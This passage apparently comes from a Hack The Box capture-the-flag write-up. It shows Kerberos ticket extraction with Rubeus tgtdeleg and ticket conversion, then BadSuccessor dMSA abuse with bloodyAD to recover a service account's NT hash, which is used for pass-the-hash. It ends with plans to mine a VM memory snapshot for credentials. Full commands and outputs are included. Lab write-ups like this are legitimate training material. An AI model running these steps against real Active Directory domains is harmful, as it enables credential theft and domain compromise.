[SNIP]      0MzkxMFqmERgPMjAyNjA5MTIwMDM5MTBapxEYDzIwMjYwOTE4MTQzOTEwWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
```

> [!Question]
>**What does `tgtdeleg` do?**
>
The `tgtdeleg` trick initiates a fake authentication handshake to a target service using **GSS-API** with the **delegation flag** set. This causes Windows to automatically embed a forwardable TGT inside the AP-REQ structure — this is a built-in Windows behaviour designed to allow services to act on your behalf. Rubeus intercepts and extracts this TGT from the AP-REQ before it goes anywhere, without ever needing to read LSASS memory or require elevated privileges. The `/nowrap` flag outputs the base64 ticket on a single line for easy copy-paste.

Next we need to decode the ticket from base64 then convert from kirbi to ccache it and export it.. 

```shell
└─$ echo 'doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMw
[SNIP]
UQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=' | base64 -d > ryan.kirbi

┌──(darklight💀ataraxia)-[~/Documents/CTF/HTB/checkpoint]
└─$ impacket-ticketConverter ryan.kirbi ryan.ccache
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done

┌──(darklight💀ataraxia)-[~/Documents/CTF/HTB/checkpoint]
└─$ export KRB5CCNAME=ryan.ccache
```

I had issues using `bloodyad` 

```shell
 faketime -f '+7hrs' \
bloodyad -d checkpoint.htb --host DC01.checkpoint.htb -k \
add badSuccessor evilmsa \
-t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
--ou "OU=DMSAHolder,DC=checkpoint,DC=htb" \
--prepatch
Traceback (most recent call last):
  File "/usr/bin/bloodyad", line 6, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/share/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 342, in main
    asyncio.run(amain())
    ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 195, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/usr/share/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 272, in amain
    output = await result
             ^^^^^^^^^^^^
  File "/usr/share/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 104, in badSuccessor
    async for e in ldap.bloodysearch(ldap.domainNC,
    ...<3 lines>...
        break
  File "/usr/share/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py", line 505, in bloodysearch
    raise NoResultError(base_dn, ldap_filter)
bloodyAD.exceptions.NoResultError: No object found in DC=checkpoint,DC=htb with filter: (sAMAccountName=None)
```

Then tried `bloodyAD` from python.

```shell
┌──(darklight💀ataraxia)-[~/Documents/CTF/HTB/checkpoint]
└─$ python3 -m venv .venv

┌──(darklight💀ataraxia)-[~/Documents/CTF/HTB/checkpoint]
└─$ source .venv/bin/activate

┌──(.venv)─(darklight💀ataraxia)-[~/Documents/CTF/HTB/checkpoint]
└─$ pip3 install bloodyAD
Collecting bloodyAD
  Downloading bloodyad-2.5.5-py3-none-any.whl.metadata (3.3 kB)
Collecting asn1crypto==1.5.1 (from bloodyAD)
  Downloading asn1crypto-1.5.1-py2.py3-none-any.whl.metadata (13 kB)
Collecting badldap>=0.7.6 (from bloodyAD)
  Downloading badldap-0.7.6-py3-none-any.wh
  [SNIP]
```

when using `bloodyAD` i ran into this error

>[!error]
>kerbad.protocol.errors.KerberosError:  Error Name: KRB_ERR_GENERIC Detail: "Generic error; the description is in the e-data field"

I removed the `--pre-patch` flag and everything worked fine.

```shell
faketime -f '+7hrs' \
bloodyAD -d checkpoint.htb --host DC01.checkpoint.htb -k \
add badSuccessor evil-dmsa \
-t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
--ou "OU=DMSAHolder,DC=checkpoint,DC=htb"
[+] Creating DMSA evil-dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : evil-dmsa$
UserRealm    : checkpoint.htb
StartTime    : 2026-09-11 15:44:03+00:00
EndTime      : 2026-09-12 00:39:10+00:00
RenewTill    : 2026-09-18 14:39:10+00:00
Flags        : renewable, forwarded, enc-pa-rep, forwardable, pre-authent
Keytype      : 18
Key          : fHkAR++ea22wnvziF1bT8JKIqzjyOuHzEM4qH1lCGEg=
EncodedKirbi :

    doIF4zCCBd+gAwIBBaEDAgEWooIEzzCCBMthggTHMIIEw6ADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwI
[SNIP]
Q0tQT0lOVC5IVEI=
[+] dMSA TGT stored in ccache file evil-dmsa_ab.ccache

dMSA current keys found in TGS:
AES256: 4a0974ef9d03adef590abbdc359fb682524c01963e134ce2ae9e91dd61ee5c7a
AES128: 4f502be933c1f7343943302dd245aac1
RC4: a2d335a49991eff23b30271d5412cadd

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

It worked perfectly. Breaking down what just happened:

**The dMSA was created and linked successfully:**
- `evil-dmsa$` created in `OU=DMSAHolder`
- Linked to `svc_deploy` as the preceded account
- TGT issued for `evil-dmsa$` and saved to `evil-dmsa_ab.ccache`

**The keys are the treasures:**
- `dMSA current keys` — these are `evil-dmsa$`'s own auto-generated keys (not useful)
- `dMSA previous keys` — this is `svc_deploy`'s NT hash inherited via the KERB-DMSA-KEY-PACKAGE:

```
RC4: e16081eb077aca74bdbf8af12af43ac9
```

The hash is valid.

```shell
nxc smb 10.129.113.84 -u 'svc_deploy' -H e16081eb077aca74bdbf8af12af43ac9 -d checkpoint.htb
SMB         10.129.113.84   445    DC01             [*] Windows 11 /Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.113.84   445    DC01             [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9
```

Earlier i tried to use the same trick on Administrator but it failed, seems we need to have write permissions on the target object to modify attributes related to dMSA.

```shell
faketime -f '+7hrs' \
bloodyAD -d checkpoint.htb --host DC01.checkpoint.htb -k \
add badSuccessor evil-dmsa-admin \
-t "CN=ADMINISTRATOR,CN=USERS,DC=CHECKPOINT,DC=HTB" \
--ou "OU=DMSAHolder,DC=checkpoint,DC=htb"
[+] Creating DMSA evil-dmsa-admin$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=ADMINISTRATOR,CN=USERS,DC=CHECKPOINT,DC=HTB
Traceback (most recent call last):
  File "/home/darklight/Documents/CTF/HTB/checkpoint/.venv/bin/bloodyAD", line 6, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/darklight/Documents/CTF/HTB/checkpoint/.venv/lib/python3.13/site-packages/bloodyAD/main.py", line 342, in main
    asyncio.run(amain())
    ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 195, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/home/darklight/Documents/CTF/HTB/checkpoint/.venv/lib/python3.13/site-packages/bloodyAD/main.py", line 272, in amain
    output = await result
             ^^^^^^^^^^^^
  File "/home/darklight/Documents/CTF/HTB/checkpoint/.venv/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 146, in badSuccessor
    await ldap.bloodymodify(target_dn,{"msDS-SupersededManagedAccountLink":[(Change.ADD.value, dmsa_dn)],"msDS-SupersededServiceAccountState":[(Change.REPLACE.value, 2)]})
  File "/home/darklight/Documents/CTF/HTB/checkpoint/.venv/lib/python3.13/site-packages/bloodyAD/network/ldap.py", line 341, in bloodymodify
    raise err
badldap.commons.exceptions.LDAPModifyException: insufficientAccessRights for CN=ADMINISTRATOR,CN=USERS,DC=CHECKPOINT,DC=HTB (Attr) — Reason:(ERROR_DS_INSUFF_ACCESS_RIGHTS) Insufficient access rights to perform the operation.
```

>[!error]
>badldap.commons.exceptions.LDAPModifyException: insufficientAccessRights for CN=ADMINISTRATOR,CN=USERS,DC=CHECKPOINT,DC=HTB (Attr) — Reason:(ERROR_DS_INSUFF_ACCESS_RIGHTS) Insufficient access rights to perform the operation.

At first i thought we only need to update/modify the attributes on the dMSA object alone but looking closely at the results of the command trying to impersonate the administrator i noticed this, 

```shell
File "/home/darklight/Documents/CTF/HTB/checkpoint/.venv/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 146, in badSuccessor
await ldap.bloodymodify(target_dn, {
  "msDS-SupersededManagedAccountLink": [(Change.ADD.value, dmsa_dn)],
  "msDS-SupersededServiceAccountState": [(Change.REPLACE.value, 2)]
})
```

**bloodyAD's `add badSuccessor` does write to the target account** — specifically it tries to set `msDS-SupersededManagedAccountLink` and `msDS-SupersededServiceAccountState` on the target object. This is the **bidirectional link** approach — it writes on both the dMSA (the `msDS-ManagedAccountPrecededByLink` side) AND on the target account (the `msDS-SupersededManagedAccountLink` side). `--prepatch` is specifically for a DC that has _not_ received the security fix for the BadSuccessor/dMSA issue, but our DC has the patch.

We have read perm on `VMBackups` share.

![[Pasted image 20260911124042.png]]

On the share we have these files

```shell
"VMBackups": {
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-000001.vmdk": {
            "atime_epoch": "2026-05-10 05:45:21",
            "ctime_epoch": "2026-05-10 05:45:21",
            "mtime_epoch": "2026-05-13 16:58:18",
            "size": "101.56 MB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmem": {
            "atime_epoch": "2026-05-10 05:40:35",
            "ctime_epoch": "2026-05-10 05:40:35",
            "mtime_epoch": "2026-05-13 16:58:18",
            "size": "2 GB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmsn": {
            "atime_epoch": "2026-05-10 05:40:35",
            "ctime_epoch": "2026-05-10 05:40:35",
            "mtime_epoch": "2026-05-15 01:32:32",
            "size": "131.76 MB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.nvram": {
            "atime_epoch": "2026-05-10 05:38:59",
            "ctime_epoch": "2026-05-10 05:38:59",
            "mtime_epoch": "2026-05-13 16:58:18",
            "size": "264.49 KB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.scoreboard": {
            "atime_epoch": "2026-05-10 05:45:21",
            "ctime_epoch": "2026-05-10 05:45:21",
            "mtime_epoch": "2026-05-13 16:58:18",
            "size": "7.46 KB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmdk": {
            "atime_epoch": "2026-05-10 05:38:59",
            "ctime_epoch": "2026-05-10 05:38:59",
            "mtime_epoch": "2026-05-13 16:58:18",
            "size": "9.5 GB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmsd": {
            "atime_epoch": "2026-05-10 05:38:59",
            "ctime_epoch": "2026-05-10 05:38:59",
            "mtime_epoch": "2026-05-13 16:58:18",
            "size": "502 B"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmx": {
            "atime_epoch": "2026-05-10 05:45:21",
            "ctime_epoch": "2026-05-10 05:45:21",
            "mtime_epoch": "2026-05-13 16:58:18",
            "size": "2.68 KB"
        },
        "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmxf": {
            "atime_epoch": "2026-05-10 05:22:43",
            "ctime_epoch": "2026-05-10 05:22:43",
            "mtime_epoch": "2026-05-13 16:58:18",
            "size": "274 B"
        }
```

The `VMBackups` share contains a 2 GB `.vmem` memory snapshot. Since memory captures authentication material and process state at the time of the snapshot, it is a high-value forensic artifact. The next step is to analyze it with Volatility and identify cached credentials, NTLM material, Kerberos tickets, relevant processes, and other authentication artifacts.
